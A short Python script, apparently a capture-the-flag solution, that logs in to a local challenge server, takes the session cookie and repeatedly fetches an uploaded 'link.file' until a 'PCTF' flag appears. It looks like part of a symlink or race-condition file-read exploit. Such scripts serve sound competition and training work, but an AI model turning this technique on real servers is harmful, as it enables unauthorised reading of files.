import requests
import threading

SERVER_ADDR = "http://127.0.0.1:5000" # change this to whatever the docker is running at

def get_cookie():
    data = {
        "username": "test", # make this user first
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

while True:
    r = requests.get(url=f"{SERVER_ADDR}/upload/payload/link.file", allow_redirects=True, cookies=cookie)
    if "PCTF" in r.text:
        print(r.text)
        break
